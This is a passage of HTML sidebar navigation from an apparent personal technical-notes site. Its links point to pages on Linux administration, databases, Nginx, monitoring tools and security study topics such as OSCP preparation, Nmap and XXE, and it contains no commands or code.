    Linux
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_27">
            <span class="md-nav__icon md-icon"></span>
            Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/Commands/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Commands
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/addSwapSpace/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to Add Swap Space on Ubuntu 20.04
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/anydesk/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Anydesk
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/formatDisk/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    formatDisk
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/liberarEspacio/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    liberarEspacio
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/linuxVersion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    linuxVersion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/mountDisk/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mountDisk
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/mountDiskBusy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to Move Home Directory to New Partition or Disk in Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/nanotabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nanotabs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/netPlan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Netplan static IP on Ubuntu configuration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/ports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ports
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/procmon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Procmon
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/resize/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Redimensionar discos duros de Servidores Cloud en Linux sin reinicios
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/staticIpLinux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to Set Static IP Address and Configure Network in Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/staticNetworkip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Configure Ubuntu WiFi Adapter with Netplan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/terminalColors/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    terminalColors
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
        
          
          <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Metricbeats
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_28">
            <span class="md-nav__icon md-icon"></span>
            Metricbeats
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Metricbeats/Metricbeats/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metricbeats in docker
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" >
        
          
          <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="">
            
  
  <span class="md-ellipsis">
    MongoDB
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_29">
            <span class="md-nav__icon md-icon"></span>
            MongoDB
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../MongoDB/BackupMongo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mongo backup and restore
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../MongoDB/dropDatabase/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Drop databases Mongo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../MongoDB/installMongo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Instalar Mongo en Ubuntu 22.04
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../MongoDB/mongoDBinstruction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mongoDBinstruction
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29_5" >
        
          
          <label class="md-nav__link" for="__nav_29_5" id="__nav_29_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Mongo replica
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_29_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_29_5">
            <span class="md-nav__icon md-icon"></span>
            Mongo replica
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../MongoDB/mongo-replica/Tutorial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tutorial
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
        
          
          <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Nagios
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_30">
            <span class="md-nav__icon md-icon"></span>
            Nagios
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30_1" >
        
          
          <label class="md-nav__link" for="__nav_30_1" id="__nav_30_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Nagios
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_30_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_30_1">
            <span class="md-nav__icon md-icon"></span>
            Nagios
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nagios/nagios/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nagios
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
        
          
          <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Netdata(Monitor)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_31">
            <span class="md-nav__icon md-icon"></span>
            Netdata(Monitor)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Netdata%28Monitor%29/docker-compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker compose
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
        
          
          <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Nextcloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_32">
            <span class="md-nav__icon md-icon"></span>
            Nextcloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nextcloud/NextCloud/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    What is Nextcloud?
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
        
          
          <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Nginx
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_33">
            <span class="md-nav__icon md-icon"></span>
            Nginx
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx/localhostConf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nginx Conf
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx/nginx_php/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nginx php
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx/reverseProxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    reverseProxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx/serverConf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    serverConf
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
        
          
          <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Nginx Proxy Manager
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_34">
            <span class="md-nav__icon md-icon"></span>
            Nginx Proxy Manager
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx%20Proxy%20Manager/AdvancedSettings/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AdvancedSettings
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx%20Proxy%20Manager/NginxPMdoc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Full Setup Instructions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx%20Proxy%20Manager/SecurytyHeaders/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SecurytyHeaders
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nginx%20Proxy%20Manager/certbotTroubleshott/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    certbotTroubleshott
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
        
          
          <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Nmap
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_35">
            <span class="md-nav__icon md-icon"></span>
            Nmap
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Nmap/scanSteps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    scanSteps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
        
          
          <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Node
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_36">
            <span class="md-nav__icon md-icon"></span>
            Node
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Node/bind80-noroot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind80 noroot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Node/buildLimiter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    buildLimiter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Node/node/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Node
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Node/node_install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Node install
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
        
          
          <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Passbolt(Vault)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_37">
            <span class="md-nav__icon md-icon"></span>
            Passbolt(Vault)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Passbolt%28Vault%29/InstallDocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker passbolt installation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
        
          
          <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Podman
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_38">
            <span class="md-nav__icon md-icon"></span>
            Podman
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Podman/Podman/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Podman
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
        
          
          <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Portainer
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_39">
            <span class="md-nav__icon md-icon"></span>
            Portainer
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Portainer/compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Portainer/templates/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Templates
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
        
          
          <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Portswiger
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_40">
            <span class="md-nav__icon md-icon"></span>
            Portswiger
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Portswiger/XXE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XXE
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
        
          
          <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="">
            
  
  <span class="md-ellipsis">
    PosteMail
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_41">
            <span class="md-nav__icon md-icon"></span>
            PosteMail
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PosteMail/InstallDocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker builds a corporate mailbox, porte.io tutorial
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
        
          
          <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Postgres
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_42">
            <span class="md-nav__icon md-icon"></span>
            Postgres
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/EmbedingsVectors/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to use PostgreSQL to store and query vector embeddings
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/PostgresBkp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PostgresBkp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/commands2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Commands2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/postgresScript/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    postgresScript
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/postgres_command/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Postgres command
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Postgres/replicaSetPost/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    replicaSetPost
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
        
          
          <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Prometheus Grafana
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_43">
            <span class="md-nav__icon md-icon"></span>
            Prometheus Grafana
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Prometheus%20Grafana/Grafana/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Grafana Docker
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" checked>
        
          
          <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="">
            
  
  <span class="md-ellipsis">
    S4vitar
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_44">
            <span class="md-nav__icon md-icon"></span>
            S4vitar
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Preparación para el OSCP (by s4vitar)
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Preparación para el OSCP (by s4vitar)
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#penetration-testing-with-kali-linux-pwk-course-and-offensive-security-certified-professional-oscp-cheat-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#indice-y-estructura-principal" class="md-nav__link">
    <span class="md-ellipsis">
      Índice y Estructura Principal
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
        
          
          <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="">
            
  
  <span class="md-ellipsis">
    SSL
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_45">
            <span class="md-nav__icon md-icon"></span>
            SSL
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SSL/SSLInstallCert/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSLInstallCert
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SSL/manualCerts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Generating The Wildcard SSL Certificate using certbot cli
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SSL/ssl-openssl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ssl openssl
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
        
          
          <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Seguridad
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_46">
            <span class="md-nav__icon md-icon"></span>
            Seguridad
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Seguridad/Plan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Plan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Seguridad/Preparaci%C3%B3n%20OSWP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Preparación para el OSWP (by s4vitar)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46_3" >
        
          
          <label class="md-nav__link" for="__nav_46_3" id="__nav_46_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_46_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_46_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Seguridad/Pentesting/Formaciones/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Formaciones
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Seguridad/Pentesting/GitHub%20PenTools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GitHub PenTools
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
